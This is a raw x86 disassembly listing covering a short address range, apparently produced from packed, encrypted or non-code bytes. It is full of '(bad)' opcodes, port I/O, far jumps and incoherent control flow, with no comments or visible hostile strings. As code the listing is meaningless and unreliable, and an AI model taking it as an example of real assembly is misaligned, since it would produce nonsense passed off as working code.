  41f9ca:	data16 mov cl,0x2a
  41f9cd:	(bad)
  41f9d1:	push   ebx
  41f9d2:	fisubr WORD PTR [edx]
  41f9d4:	ins    BYTE PTR es:[edi],dx
  41f9d5:	pop    ebp
  41f9d6:	mov    cl,0xa4
  41f9d8:	push   esi
  41f9d9:	mov    ah,0xf
  41f9db:	fadd   st,st(5)
  41f9dd:	je     0x41fa00
  41f9df:	out    dx,al
  41f9e0:	stos   DWORD PTR es:[edi],eax
  41f9e1:	pushf  
  41f9e2:	mov    esi,0x1839185b
  41f9e7:	mov    edi,0xfbc13544
  41f9ec:	sahf   
  41f9ed:	adc    ah,bh
  41f9ef:	adc    al,0xe
  41f9f1:	imul   ah
  41f9f3:	cmp    DWORD PTR [edx+ecx*2],ebx
  41f9f6:	retf   0x25e4
  41f9f9:	or     DWORD PTR [ebp-0x29ab81f3],esp
  41f9ff:	mov    al,0xf1
  41fa01:	cdq    
  41fa02:	fwait
  41fa03:	add    DWORD PTR [ecx+0x3ed6a067],esp
  41fa09:	sbb    al,0xb5
  41fa0b:	into   
  41fa0c:	sar    DWORD PTR ds:0x9ee95bff,0xbb
  41fa13:	(bad)  
  41fa14:	xor    bh,dl
  41fa16:	xor    DWORD PTR [ecx+0x126d2d4e],eax
  41fa1c:	jo     0x41fa30
  41fa1e:	into   
  41fa1f:	push   esp
  41fa20:	mov    ds:0x655bd1bd,al
  41fa25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa26:	jnp    0x41fa4a
  41fa28:	(bad)  [ebx]
  41fa2a:	ret    0xe8c0
  41fa2d:	mov    al,0x61
  41fa2f:	into   
  41fa30:	sbb    ebp,ecx
  41fa32:	push   edi
  41fa33:	adc    ecx,DWORD PTR [esi+0x64]
  41fa36:	xchg   DWORD PTR [eax+0x587ba636],eax
  41fa3c:	popf   
  41fa3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa3e:	mov    al,ds:0x1e0da543
  41fa43:	mov    bh,0x9a
  41fa45:	jmp    0x41f9fa
  41fa47:	xchg   esp,eax
  41fa48:	(bad)  
  41fa49:	lock mov ebx,DWORD PTR [eax-0x11c4f8eb]
  41fa50:	push   esi
  41fa51:	inc    edx
  41fa52:	repz xlat BYTE PTR ds:[ebx]
  41fa54:	enter  0x8dfc,0xc5
  41fa58:	lods   eax,DWORD PTR ds:[esi]
  41fa59:	das    
  41fa5a:	pop    ss
  41fa5b:	repz scas eax,DWORD PTR es:[edi]
  41fa5d:	jp     0x41fa18
  41fa5f:	lods   al,BYTE PTR ds:[esi]
  41fa60:	jge    0x41fab1
  41fa62:	jg     0x41f9f5
  41fa64:	add    ah,BYTE PTR [ebx-0x549e6bec]
  41fa6a:	lods   eax,DWORD PTR ds:[esi]
  41fa6b:	in     al,dx
  41fa6c:	cli    
  41fa6d:	iret   
  41fa6e:	jne    0x41fa73
  41fa70:	pop    esp
  41fa71:	cwde   
  41fa72:	js     0x41fa57
  41fa74:	jmp    0x93d6ff54
  41fa79:	xchg   ecx,eax
  41fa7a:	and    al,0x80
  41fa7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa7d:	jl     0x41fa30
  41fa7f:	xchg   esp,eax
  41fa80:	xor    eax,0x44f0a94a
  41fa85:	jno    0x41fad9
  41fa87:	jecxz  0x41fab0
  41fa89:	or     DWORD PTR [edi-0x6a],ebx
  41fa8c:	stc    
  41fa8d:	dec    DWORD PTR [edi+0x6a4b2132]
  41fa93:	push   ecx
  41fa94:	xor    eax,0x86f05fed
  41fa99:	imul   esp,DWORD PTR [eax+0x8],0x1a716918
  41faa0:	jmp    ebx
  41faa2:	mov    edx,0xab9d5e09
  41faa7:	push   ss
  41faa8:	xchg   edi,eax
  41faa9:	xor    dl,BYTE PTR [ecx+0x23]
  41faac:	inc    esi
  41faad:	dec    BYTE PTR ds:0xb24414d9
  41fab3:	hlt    
  41fab4:	popf   
  41fab5:	mov    BYTE PTR ds:0x9ba4a508,cl
  41fabb:	adc    esi,DWORD PTR [eax+ebx*1-0xe4024bc]
  41fac2:	fsub   QWORD PTR [eax-0x5b431f85]
  41fac8:	rcr    bl,1
  41faca:	out    0xa4,al
  41facc:	pop    edx
  41facd:	fwait
  41face:	add    al,0xf3
  41fad0:	lds    eax,FWORD PTR [edx+ecx*4-0x4590de12]
  41fad7:	or     al,0x18
  41fad9:	mov    ecx,ebx
  41fadb:	adc    edi,DWORD PTR [eax-0x2da9e0c1]
  41fae1:	adc    bh,ah
  41fae3:	js     0x41fae8
  41fae5:	inc    ebx
  41fae6:	pop    ebp
  41fae7:	pop    edi
  41fae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fae9:	xchg   ecx,eax
  41faea:	arpl   ax,bp
  41faec:	and    al,0x99
  41faee:	(bad)  
  41faef:	(bad)  
  41faf0:	sbb    bl,bl
  41faf2:	add    al,0xdd
  41faf4:	cs cmp al,0x6f
  41faf7:	mov    edi,0x450d3a09
  41fafc:	sti    
  41fafd:	repz (bad) 
  41fb00:	mov    DWORD PTR [esi-0x12],eax
  41fb03:	jl     0x41faa1
  41fb05:	shr    BYTE PTR [ebx-0x2],cl
  41fb08:	sbb    bl,BYTE PTR [ecx]
  41fb0a:	or     DWORD PTR [eax+0x1408c20a],0x5b
  41fb11:	or     DWORD PTR [ebp-0x64],0xadb91fb4
  41fb18:	sbb    BYTE PTR [eax+0x20],dh
  41fb1b:	pop    es
  41fb1c:	xchg   edi,eax
  41fb1d:	and    al,0xfc
  41fb1f:	je     0x41fb3d
  41fb21:	cmc    
  41fb22:	scas   eax,DWORD PTR es:[edi]
  41fb23:	cld    
  41fb24:	dec    edi
  41fb25:	mov    eax,ds:0xa88a6a1b
  41fb2a:	clc    
  41fb2b:	imul   edi,DWORD PTR [ebp-0x3],0xffffffd9
  41fb2f:	and    DWORD PTR [esi],0xffffffe2
  41fb32:	leave  
  41fb33:	and    al,0xe6
  41fb35:	inc    esi
  41fb36:	fdivr  DWORD PTR [edx]
  41fb38:	dec    ebx
  41fb39:	cdq    
  41fb3a:	sti    
  41fb3b:	xor    cl,BYTE PTR [ecx]
  41fb3d:	pop    es
  41fb3e:	retf   
  41fb3f:	push   esi
  41fb40:	repz sbb DWORD PTR [esi-0x4846e5e1],0xffffffdb
  41fb48:	mov    sp,0x374b
  41fb4c:	mov    es,WORD PTR [ebx-0x31]
  41fb4f:	mov    eax,ds:0xa191f314
  41fb54:	cmc    
  41fb55:	xor    DWORD PTR [esi+0x304c52ef],0x3c4953be
  41fb5f:	repz fidivr DWORD PTR cs:[eax+0x64]
  41fb64:	add    ah,BYTE PTR [eax+0x152d85cf]
  41fb6a:	mov    esp,0x310914b6
  41fb6f:	sub    esp,DWORD PTR [ebx+0x20ed0c06]
  41fb75:	test   eax,0x7c91ee0c
  41fb7a:	mov    ds:0xf643509,al
  41fb7f:	adc    eax,0xfdc123
  41fb84:	lods   al,BYTE PTR ds:[esi]
  41fb85:	and    DWORD PTR [esi+0x5ff990ab],edi
  41fb8b:	xchg   esp,eax
  41fb8c:	(bad)  
  41fb8d:	jmp    0xd0b90022
  41fb92:	mov    ch,0x69
  41fb94:	xchg   ebp,eax
  41fb95:	jns    0x41fb59
  41fb97:	out    0x28,al
  41fb99:	jecxz  0x41fb93
  41fb9b:	push   ss
  41fb9c:	sbb    ch,BYTE PTR [ecx-0x5ca51e4c]
  41fba2:	test   BYTE PTR [ebx+0x4b],ah
  41fba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fba6:	sub    esp,DWORD PTR [esp+ebp*2-0x62]
  41fbaa:	pop    esi
  41fbab:	push   0xffffffa6
  41fbad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbaf:	add    BYTE PTR [eax-0xfb1ace],al
  41fbb5:	sbb    dh,BYTE PTR [esp+ebx*4+0x9]
  41fbb9:	or     dl,cl
  41fbbb:	icebp  
  41fbbc:	inc    esi
  41fbbd:	sbb    ah,BYTE PTR [ecx+0xa]
  41fbc0:	lds    eax,FWORD PTR [esi-0x7a84ae9b]
  41fbc6:	mov    cl,0xba
  41fbc8:	push   0x4b
  41fbca:	mov    dl,0x84
  41fbcc:	jge    0x41fb52
  41fbce:	ja     0x41fbad
  41fbd0:	jne    0x41fb83
  41fbd2:	scas   eax,DWORD PTR es:[edi]
  41fbd3:	jmp    0x19a6:0xab65644
  41fbda:	imul   ecx,eax,0x2d
  41fbdd:	mov    al,ds:0x1ac9894b
  41fbe2:	ins    BYTE PTR es:[edi],dx
  41fbe3:	xchg   DWORD PTR [ebp+0x79],ecx
  41fbe6:	iret   
  41fbe7:	sub    DWORD PTR [esi],ebx
  41fbe9:	cmp    DWORD PTR [edx],ebp
  41fbeb:	cmp    eax,0xcfe79616
  41fbf0:	or     al,0xbd
  41fbf2:	xchg   edx,eax
  41fbf3:	mov    dh,0xc5
  41fbf5:	leave  
  41fbf6:	cld    
  41fbf7:	out    0x7b,eax
  41fbf9:	sbb    eax,0xf4c51d46
  41fbfe:	jae    0x41fbf9
  41fc00:	seto   BYTE PTR [ebp-0x639b8b87]
  41fc07:	jno    0x41fbbe
  41fc09:	lahf   
  41fc0a:	mov    ds:0x3ef5e758,eax
  41fc0f:	adc    eax,0x4c3ba5e2
  41fc14:	add    DWORD PTR [ebx-0x6be8af76],esp
  41fc1a:	fwait
  41fc1b:	shl    BYTE PTR [esi],0xf4
  41fc1e:	mov    edx,0xe55041e4
  41fc23:	mov    bl,0xed
  41fc25:	lahf   
  41fc26:	pop    ebx
  41fc27:	sub    BYTE PTR [ebp+ecx*1-0x39ff4b81],0x6d
  41fc2f:	cmp    ebx,ebp
  41fc31:	and    BYTE PTR [edx-0x452c7c1c],dh
  41fc37:	adc    eax,DWORD PTR [esi-0x3ddc633e]
  41fc3d:	sar    BYTE PTR [edi+eiz*8+0x42],cl
  41fc41:	dec    ebx
  41fc42:	xor    DWORD PTR [esi-0x6b396e1c],edi
  41fc48:	(bad)  
  41fc49:	in     eax,0xe3
  41fc4b:	pusha  
  41fc4c:	nop
  41fc4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc4e:	pop    ebp
  41fc4f:	call   0x56d03fd7
  41fc54:	jbe    0x41fcc4
  41fc56:	mov    ch,0x8
  41fc58:	ins    DWORD PTR es:[edi],dx
  41fc59:	lahf   
  41fc5a:	fstp   TBYTE PTR [ebx]
  41fc5c:	imul   dh
  41fc5e:	jae    0x41fc77
  41fc60:	popa   
  41fc61:	dec    esi
  41fc62:	ja     0x41fc39
  41fc64:	cmp    cl,BYTE PTR [esp+esi*1-0x664fb18]
  41fc6b:	sbb    al,0x46
  41fc6d:	enter  0x7389,0x39
  41fc71:	stc    
  41fc72:	mov    eax,0xba0b987d
  41fc77:	les    ebx,FWORD PTR [esi+0x7e0f1e16]
  41fc7d:	jle    0x41fc3c
  41fc7f:	push   esp
  41fc80:	sub    ebx,ebx
  41fc82:	or     BYTE PTR [eax],dl
  41fc84:	(bad)  
  41fc85:	sub    ah,dh
  41fc87:	les    ebx,FWORD PTR [eax]
  41fc89:	sub    eax,0xfc847d85
  41fc8e:	xchg   esp,eax
  41fc8f:	in     al,0x6
  41fc91:	scas   al,BYTE PTR es:[edi]
  41fc92:	mov    ebx,0xb2f38384
  41fc97:	fild   DWORD PTR [ebp+0x64]
  41fc9a:	gs repnz cmp al,0xb3
  41fc9e:	pop    ss
  41fc9f:	ins    BYTE PTR es:[edi],dx
  41fca0:	sbb    BYTE PTR [ecx-0x635db272],cl
  41fca6:	js     0x41fcb0
  41fca8:	pop    ecx
  41fca9:	jle    0x41fc98
  41fcab:	stc    
  41fcac:	sub    esp,DWORD PTR [esi+0x4b60394f]
  41fcb2:	cmp    eax,DWORD PTR [ebp-0x34c936db]
  41fcb8:	jmp    0xcc8e:0x3449b9eb
  41fcbf:	pushf  
  41fcc0:	inc    esi
  41fcc1:	scas   eax,DWORD PTR es:[edi]
  41fcc2:	and    esi,edi
  41fcc4:	cmc    
  41fcc5:	enter  0x16be,0x92
  41fcc9:	dec    ecx
  41fcca:	fbstp  TBYTE PTR [eax+edx*1-0x247fefb2]
  41fcd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcd2:	in     eax,0x21
  41fcd4:	ret    0xeb9f
  41fcd7:	sub    DWORD PTR es:[edx+ebx*8-0x78],esp
  41fcdc:	jp     0x41fc98
  41fcde:	ja     0x41fd38
  41fce0:	or     bh,BYTE PTR [ecx-0x2d]
  41fce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fce4:	push   ss
  41fce5:	test   eax,0x6106167a
  41fcea:	enter  0xfde,0x34
  41fcee:	dec    edi
  41fcef:	gs sbb ch,cl
  41fcf2:	cmp    bl,dl
  41fcf4:	mov    al,ds:0x238c6416
  41fcf9:	cdq    
  41fcfa:	pop    ss
  41fcfb:	inc    edx
  41fcfc:	stos   DWORD PTR es:[edi],eax
  41fcfd:	push   ds
  41fcfe:	pop    ebx
  41fcff:	lods   eax,DWORD PTR ds:[esi]
  41fd00:	mov    ebp,0x65f35ba6
  41fd05:	loope  0x41fd2f
  41fd07:	cmp    BYTE PTR [ebp-0x26],bl
  41fd0a:	xor    al,0x7
  41fd0c:	(bad)  
  41fd0d:	jmp    0xceca:0x160304bf
  41fd14:	inc    ebp
  41fd15:	out    dx,eax
  41fd16:	dec    eax
  41fd17:	in     eax,0x89
  41fd19:	outs   dx,DWORD PTR ds:[esi]
  41fd1a:	inc    ebp
  41fd1b:	out    dx,al
  41fd1c:	and    DWORD PTR [ecx+0x68],ebp
  41fd1f:	call   0x2d238a76
  41fd24:	fcmovnb st,st(4)
  41fd26:	or     esi,esp
  41fd28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd29:	jno    0x41fccd
  41fd2b:	lock push 0x3f
  41fd2e:	adc    esp,esp
  41fd30:	push   ds
  41fd31:	leave  
  41fd32:	ins    BYTE PTR es:[edi],dx
  41fd33:	in     eax,dx
  41fd34:	mov    dl,0x22
  41fd36:	shr    esp,cl
  41fd38:	call   0x789ce90b
  41fd3d:	xchg   edx,eax
  41fd3e:	push   esp
  41fd3f:	into   
  41fd40:	and    DWORD PTR [edx-0x57caa805],edx
  41fd46:	outs   dx,BYTE PTR ds:[esi]
  41fd47:	(bad)  
  41fd48:	push   ds
  41fd49:	jmp    0xaa880026
  41fd4e:	in     al,0xd7
  41fd50:	xchg   edx,eax
  41fd51:	call   0xf13f:0x49ee4b8b
  41fd58:	dec    ebp
  41fd59:	add    edx,DWORD PTR [ebx-0x77]
  41fd5c:	dec    esp
  41fd5d:	mov    ch,0xb7
  41fd5f:	in     al,0x0
  41fd61:	sub    al,0xcb
  41fd63:	gs jne 0x41fd20
  41fd66:	or     ebp,edi
  41fd68:	stos   DWORD PTR es:[edi],eax
  41fd69:	mov    DWORD PTR [edi+0x4579204a],esi
  41fd6f:	mov    cl,0x9a
  41fd71:	xor    BYTE PTR [eax-0x5462af1e],dl
  41fd77:	xlat   BYTE PTR ds:[ebx]
  41fd78:	(bad)  
  41fd79:	pusha  
  41fd7a:	std    
  41fd7b:	addr16 jle 0x41fde0
  41fd7e:	cmp    bh,BYTE PTR [edx]
  41fd80:	ins    DWORD PTR es:[edi],dx
  41fd81:	adc    BYTE PTR [esi-0x4104526a],dl
  41fd87:	mov    BYTE PTR [eax+ebp*4],al
  41fd8a:	pop    ebx
  41fd8b:	ret    0x7459
  41fd8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd8f:	pop    esi
  41fd90:	cs (bad) 
  41fd92:	mov    esp,0xb982ce8a
  41fd97:	push   esp
  41fd98:	cmc    
  41fd99:	mov    dl,0x14
  41fd9b:	(bad)  
  41fd9c:	push   esi
  41fd9d:	or     bl,BYTE PTR [edx]
  41fd9f:	add    esp,ebx
  41fda1:	js     0x41fd87
  41fda3:	rcl    DWORD PTR [ebp-0x6f],0x37
  41fda7:	outs   dx,BYTE PTR ds:[esi]
  41fda8:	in     al,0x5a
  41fdaa:	xchg   edi,eax
  41fdab:	push   es
  41fdac:	cmp    edi,DWORD PTR [edi]
  41fdae:	loopne 0x41fe10
  41fdb0:	mov    ch,0xa0
  41fdb2:	mov    eax,ds:0x2a381567
  41fdb7:	out    dx,al
  41fdb8:	fidiv  WORD PTR [edx+0x2919cc3c]
  41fdbe:	out    0xa5,al
  41fdc0:	in     eax,0x11
  41fdc2:	hlt    
  41fdc3:	shr    BYTE PTR [ebp+ebx*4-0x437c01a5],cl
  41fdca:	jecxz  0x41fd5d
  41fdcc:	lock inc ebx
  41fdce:	add    ch,al
  41fdd0:	aam    0xe3
  41fdd2:	mov    eax,0xf4697b84
  41fdd7:	je     0x41fd5e
  41fdd9:	jno    0x41fdd4
  41fddb:	out    0x27,al
  41fddd:	mov    ecx,0x6216b9ce
  41fde2:	push   cs
  41fde3:	ds iret 
  41fde5:	call   0xabfd429d
  41fdea:	scas   eax,DWORD PTR es:[edi]
  41fdeb:	repz mov ch,0x4a
  41fdee:	xchg   bl,dh
  41fdf0:	push   es
  41fdf1:	xchg   esp,eax
  41fdf2:	xchg   esp,eax
  41fdf3:	adc    edi,DWORD PTR [ebp-0xa3130e4]
  41fdf9:	inc    ebx
  41fdfa:	and    ch,0x82
  41fdfd:	or     edx,DWORD PTR [ecx]
  41fdff:	push   cs
  41fe00:	push   esi
  41fe01:	mov    edi,0x4a1c62ac
  41fe06:	inc    esi
  41fe07:	out    0x19,eax
  41fe09:	jns    0x41fe03
  41fe0b:	stc    
  41fe0c:	lock (bad) 
  41fe0e:	jmp    0x41fde8
  41fe10:	out    0xca,al
  41fe12:	add    ah,al
  41fe14:	push   eax
  41fe15:	cmc    
  41fe16:	dec    ebx
  41fe17:	sub    edx,DWORD PTR [esi+0x251b7472]
  41fe1d:	mov    ecx,0x1a7e30fc
  41fe22:	mov    ds:0x6c10272d,al
  41fe27:	popa   
  41fe28:	xlat   BYTE PTR ds:[ebx]
  41fe29:	jno    0x41fdeb
  41fe2b:	mov    WORD PTR [eax+0x63],ds
  41fe2e:	or     ebx,ebp
  41fe30:	and    al,0x9
  41fe32:	sub    DWORD PTR [ebx+0x466fe503],0x847b9d67
  41fe3c:	jg     0x41feb8
  41fe3e:	cmc    
  41fe3f:	jecxz  0x41fe4a
  41fe41:	mov    ebx,ebx
  41fe43:	(bad)  
  41fe45:	or     al,0x8d
  41fe47:	xor    bx,WORD PTR [ebx+0x284088b2]
  41fe4e:	push   edi
  41fe4f:	inc    ebx
  41fe50:	test   esi,ecx
  41fe52:	xchg   ebx,eax
  41fe53:	in     eax,dx
  41fe54:	sbb    eax,0x2e6f8cab
  41fe59:	mov    DWORD PTR ds:0x5b31fdc1,esi
  41fe5f:	out    dx,al
  41fe60:	and    eax,0x74071557
  41fe65:	pop    es
  41fe66:	retf   0x55e9
  41fe69:	xchg   al,cl
  41fe6b:	call   0x484260c1
  41fe70:	and    ebx,DWORD PTR [ecx-0x69d8759e]
  41fe76:	adc    ebp,DWORD PTR [ebx-0x5b]
  41fe79:	cdq    
  41fe7a:	sti    
  41fe7b:	data16 jp 0x41fee6
  41fe7e:	ja     0x41fe7f
  41fe80:	mul    BYTE PTR [edi]
  41fe82:	mov    bh,0x41
  41fe84:	pop    ss
  41fe85:	jne    0x41fe37
  41fe87:	les    ebp,FWORD PTR [ebp-0x80]
  41fe8a:	cmp    DWORD PTR [edi-0x18b0b64b],ebp
  41fe90:	mov    dl,cl
  41fe92:	dec    ecx
  41fe93:	test   al,0xf8
  41fe95:	pop    edx
  41fe96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe97:	xchg   ebp,eax
  41fe98:	(bad)  
  41fe9a:	jmp    0x41fed5
  41fe9c:	outs   dx,DWORD PTR ds:[esi]
  41fe9d:	sub    BYTE PTR [ebx+0x6469505e],bl
  41fea3:	push   esi
  41fea4:	adc    ah,BYTE PTR ds:0x61a773e7
  41feaa:	fnstsw WORD PTR [ebx-0x1ae4d643]
  41feb0:	rol    BYTE PTR [esi],1
  41feb2:	shl    DWORD PTR [edx+ebp*2],cl
  41feb5:	in     eax,0xef
  41feb7:	fs push ebx
  41feb9:	mov    eax,ds:0x7ba256d3
  41febe:	lods   al,BYTE PTR ds:[esi]
  41febf:	ins    BYTE PTR es:[edi],dx
  41fec0:	xor    BYTE PTR [esi+0x7f6e1042],ah
  41fec6:	mov    esi,0xb3dd9e6a
  41fecb:	ja     0x41fe76
  41fecd:	out    0xa,eax
  41fecf:	ins    BYTE PTR es:[edi],dx
  41fed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fed1:	lahf   
  41fed2:	mov    eax,0x1018ae84
  41fed7:	cmp    esi,DWORD PTR [ebp+0x6fe5f1b7]
  41fedd:	mov    ah,0xf5
  41fedf:	cdq    
  41fee0:	gs ja  0x41fe73
  41fee3:	rcl    DWORD PTR [edi],cl
  41fee5:	stc    
  41fee6:	cli    
  41fee7:	mov    bl,0x41
  41fee9:	mov    al,ds:0xa0ce0c82
  41feee:	mov    DWORD PTR [ebp-0x3b],ebx
  41fef1:	(bad)  
  41fef2:	dec    edi
  41fef3:	out    dx,eax
  41fef4:	mov    ah,0x88
  41fef6:	jp     0x41ff5d
  41fef8:	push   ss
  41fef9:	mov    DWORD PTR [edx+edx*4],edi
  41fefc:	pop    ecx
  41fefd:	cs pop ebp
  41feff:	sbb    DWORD PTR [eax-0x66],ebx
  41ff02:	dec    ebx
  41ff03:	retf   0xb50a
  41ff06:	and    edi,esp
  41ff08:	adc    BYTE PTR [edi-0x40],dl
  41ff0b:	mov    ebp,0x25a97ace
  41ff10:	test   eax,0x6ef4979c
  41ff15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff16:	sub    edi,DWORD PTR [ebx+0x8]
  41ff19:	mov    ecx,0x77b854c3
  41ff1e:	in     eax,dx
  41ff1f:	fild   DWORD PTR [ebp+ebp*4-0x1f]
  41ff23:	xchg   esp,eax
  41ff24:	neg    DWORD PTR [edx+0x4de34bf3]
  41ff2a:	aas    
  41ff2b:	fs enter 0x2c41,0x3b
  41ff30:	and    BYTE PTR [ecx-0x57],cl
  41ff33:	adc    ebp,edx
  41ff35:	inc    edx
  41ff36:	inc    esi
  41ff37:	sbb    eax,0xd594013f
  41ff3c:	jae    0x41ffa4
  41ff3e:	adc    bl,ch
  41ff40:	xlat   BYTE PTR ds:[ebx]
  41ff41:	and    edi,DWORD PTR [edi+0x3ba8814a]
  41ff47:	inc    ecx
  41ff48:	xor    al,0x3b
  41ff4a:	out    0x96,eax
  41ff4c:	adc    ebp,DWORD PTR [eax-0x1432b9d3]
  41ff52:	mov    cl,0xe4
  41ff54:	push   ebp
  41ff55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff56:	mov    ch,0xab
  41ff58:	imul   edi
  41ff5a:	dec    ecx
  41ff5b:	test   eax,0xe4f13369
  41ff60:	xchg   ebp,eax
  41ff61:	scas   al,BYTE PTR es:[edi]
  41ff62:	(bad)  
  41ff64:	dec    edx
  41ff65:	cmp    BYTE PTR [edx-0x4c129bc],dh
  41ff6b:	ins    BYTE PTR es:[edi],dx
  41ff6c:	lds    esi,FWORD PTR [edi+ecx*2-0x10]
  41ff70:	mov    esp,0x1fbe8b4d
  41ff75:	out    0x96,eax
  41ff77:	push   ss
  41ff78:	retf   
  41ff79:	int3   
  41ff7a:	mov    dl,0x74
  41ff7c:	mov    DWORD PTR [edx],0x8a291e39
  41ff82:	sub    al,ch
  41ff84:	shrd   DWORD PTR [edi],ebp,0x2d
  41ff88:	shl    BYTE PTR [ebx-0x26091539],0xd7
  41ff8f:	pop    ss
  41ff90:	test   BYTE PTR [ebp-0x3095ab73],ah
  41ff96:	mov    ecx,0xbba293fd
  41ff9b:	in     al,dx
  41ff9c:	jecxz  0x41fff5
  41ff9e:	jge    0x41ff2b
  41ffa0:	and    eax,0x1f1e11aa
  41ffa5:	or     DWORD PTR [esi],esp
  41ffa7:	cmp    al,0x6f
  41ffa9:	fcomp  QWORD PTR [ebx]
  41ffab:	les    edi,FWORD PTR [eax]
  41ffad:	lds    edi,FWORD PTR [ebx+0x44a177c3]
  41ffb3:	sbb    bl,BYTE PTR [edx]
  41ffb5:	mov    ebp,0x9918197b
  41ffba:	jo     0x41ff66
  41ffbc:	push   edi
  41ffbd:	push   edx
  41ffbe:	ret    
  41ffbf:	push   ebx
  41ffc0:	mov    al,ds:0x6eb12d69
  41ffc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffc6:	pop    ds
  41ffc7:	or     eax,0xc28c3872
  41ffcc:	pop    esp
  41ffcd:	fdiv   DWORD PTR [eax-0x4d456eee]
  41ffd3:	mov    ah,0x22
  41ffd5:	fld    QWORD PTR [ebx+edi*1-0x7b]
  41ffd9:	icebp  
  41ffda:	dec    ebx
  41ffdb:	jmp    0x6917:0xbff88aba
  41ffe2:	out    0x24,eax
  41ffe4:	xchg   edx,eax
  41ffe5:	push   edx
  41ffe6:	pop    eax
  41ffe7:	add    al,0x8f
  41ffe9:	lods   al,BYTE PTR ds:[esi]
  41ffea:	jnp    0x41ffdc
  41ffec:	mov    DWORD PTR [eax-0x64],0x3f9c3805
  41fff3:	(bad)  
  41fff4:	mov    ebp,0x5c1110b
  41fff9:	stos   BYTE PTR es:[edi],al
  41fffa:	sbb    eax,DWORD PTR [esi+ebp*8+0x24fd75cb]
  420001:	mov    esi,0xfd83cf2a
  420006:	or     eax,0x84a557e8
  42000b:	(bad)  [ecx-0x690191ce]
  420011:	pop    ebp
  420012:	sbb    ebx,DWORD PTR [ebp+0xac0994f]
  420018:	xchg   edx,eax
  420019:	(bad)  
  42001a:	or     al,dh
  42001c:	push   eax
  42001d:	cdq    
  42001e:	aaa    
  42001f:	nop
  420020:	es sbb al,0x7d
  420023:	push   esp
  420024:	out    dx,al
  420025:	ret    0xb660
  420028:	sbb    dh,BYTE PTR [ebx+0x79213925]
  42002e:	jl     0x41ffdb
  420030:	loope  0x42003f
  420032:	je     0x41ffd3
  420034:	pusha  
  420035:	mov    al,ds:0x8b9fbe0b
  42003a:	pushf  
  42003b:	mov    ebx,0x44f11121
  420040:	mov    dh,0x5e
  420042:	mov    ah,0x44
  420044:	jne    0x42009b
  420046:	dec    edi
  420047:	xor    al,0x85
  420049:	test   eax,0xc0e7ecd1
  42004e:	or     al,BYTE PTR [edi+edx*1]
  420051:	mov    DWORD PTR [ecx],ecx
  420053:	rcr    eax,cl
  420055:	repz sar DWORD PTR [edi],cl
  420058:	pop    ss
  420059:	mov    eax,ds:0x884a693b
  42005e:	or     BYTE PTR [ecx+0x32],ah
  420061:	and    DWORD PTR [edx*8-0x86dffae],esp
  420068:	mov    edx,0xda04baf1
  42006d:	loope  0x4200ca
  42006f:	scas   eax,DWORD PTR es:[edi]
  420070:	inc    esi
  420071:	je     0x42001e
  420073:	inc    ebx
  420074:	popf   
  420075:	mov    BYTE PTR [edx],0xe6
  420078:	xor    ch,cl
  42007a:	sub    DWORD PTR [ebx+ebp*1-0x66],ecx
  42007e:	xchg   esi,eax
  42007f:	fst    QWORD PTR [esi+0x6589e265]
  420085:	(bad)  
  420086:	sbb    ebp,edi
  420088:	aaa    
  420089:	into   
  42008a:	pop    es
  42008b:	cmp    DWORD PTR ds:0x5dd34349,esp
  420091:	pop    edi
  420092:	xor    eax,0x2ba6c83d
  420097:	mov    ecx,0xc9ed6e81
  42009c:	adc    dh,BYTE PTR [edi+eiz*4-0x4435ee6d]
  4200a3:	adc    eax,DWORD PTR ds:0x77330fa0
  4200a9:	call   0x5c5962b4
  4200ae:	jne    0x420074
  4200b0:	xor    eax,0x96e842e2
  4200b5:	loopne 0x420052
  4200b7:	jne    0x420085
  4200b9:	(bad)  
  4200ba:	mov    cl,0x74
  4200bc:	push   edx
  4200bd:	inc    esp
  4200be:	cmp    DWORD PTR [esi],ebp
  4200c0:	test   BYTE PTR [edx-0x2604e329],0x84
  4200c7:	mov    DWORD PTR [esi],ebx
  4200c9:	dec    esp
  4200ca:	xor    eax,0xb3090074
  4200cf:	inc    esp
  4200d0:	or     eax,0x5512ed16
  4200d5:	cmp    al,0x9a
  4200d7:	in     al,dx
  4200d8:	xor    DWORD PTR [ecx+0x2],eax
  4200db:	adc    al,0x16
  4200dd:	sbb    DWORD PTR [edx+0x40],ecx
  4200e0:	sub    DWORD PTR [ebp+0x53],ebx
  4200e3:	out    dx,eax
  4200e4:	cwde   
  4200e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200e6:	or     ecx,DWORD PTR [ebx]
  4200e8:	inc    ecx
  4200e9:	push   edi
  4200ea:	adc    ecx,0xffffffbc
  4200ed:	push   esi
  4200ee:	popa   
  4200ef:	outs   dx,DWORD PTR ds:[esi]
  4200f0:	xchg   DWORD PTR [edi-0x11fd2b4f],edx
  4200f6:	in     eax,dx
  4200f7:	in     al,0x39
  4200f9:	cmp    dl,BYTE PTR [eax+0x6a]
  4200fc:	icebp  
  4200fd:	popf   
  4200fe:	jae    0x42013f
  420100:	cmp    edx,esp
  420102:	call   DWORD PTR [edi+0x7a301a01]
  420108:	add    DWORD PTR [ecx],0x69
  42010b:	xchg   edx,eax
  42010c:	enter  0xb352,0xf4
  420110:	dec    ebp
  420111:	jl     0x42016e
  420113:	ins    BYTE PTR es:[edi],dx
  420114:	xor    eax,0x5bf44778
  420119:	jnp    0x42009e
  42011b:	fbld   TBYTE PTR [edx]
  42011d:	imul   edx,DWORD PTR [edx],0x288115a9
  420123:	and    eax,0xea9b99f6
